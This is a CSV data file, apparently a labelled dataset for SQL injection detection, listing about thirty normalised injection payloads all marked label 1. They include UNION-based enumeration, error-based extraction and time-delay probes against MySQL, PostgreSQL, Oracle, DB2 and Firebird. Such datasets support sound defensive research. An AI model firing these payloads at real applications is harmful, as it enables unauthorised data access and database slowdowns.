row_index,payload_norm,label,sqli_type_hint
7740,"1"" ) union all select null,null,null#",1,
7741,1 ) ) as zykv where 2158 = 2158,1,
7742,"-2006' ) ) union all select 7852,7852,7852,7852,7852--",1,
7743,"-2948' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'ivwt' = 'ivwt",1,
7744,"1 ) as zelk where 1944 = 1944 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
7745,"1%"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = """,1,
7746,1 ) ) as fqee where 3286 = 3286,1,
7747,"1"" ) where 7452 = 7452",1,
7748,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",1,
7749,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ltym' = 'ltym",1,
7750,"1' ) ) union all select null,null,null,null,null,null#",1,
7751,"1"" ) as ffon where 2738 = 2738 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",1,
7752,"select * from generate_series ( 9058,9058,case when ( 9058 = 1183 ) then 1 else 0 end ) limit 1--",1,
7753,"1' ) as yjdg where 5262 = 5262 union all select null,null,null#",1,
7754,"-2860"" ) ) order by 1#",1,
7755,"elt ( 2427 = 2427,5518 )",1,
7756,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) -- ivku",1,
7757,"1' ) where 6274 = 6274 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
7758,"1'+ ( select 'asdq' where 4023 = 4023 and make_set ( 8403 = 8403,8899 ) ) +'",1,
7759,1' ) ) as fcjk where 7755 = 7755,1,
7760,-4896' ) union all select 1929--,1,
7761,"1"" ) ) and 4595 = 4595#",1,
7762,"-9582' ) where 4397 = 4397 union all select 4397,4397,4397#",1,
7763,"-9110"" ) ) union all select 2263,2263,2263,2263,2263#",1,
7764,"-8118"" ) where 3561 = 3561 or ( 8459 = 8459 ) *4906--",1,
7765,"1"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""zxks"" = ""zxks",1,
7766,"1"" ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( ""kfdh"" like ""kfdh",1,
7767,"1"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
7768,"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""rtzn"" = ""rtzn",1,
7769,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( 'ootz' like 'ootz",1,
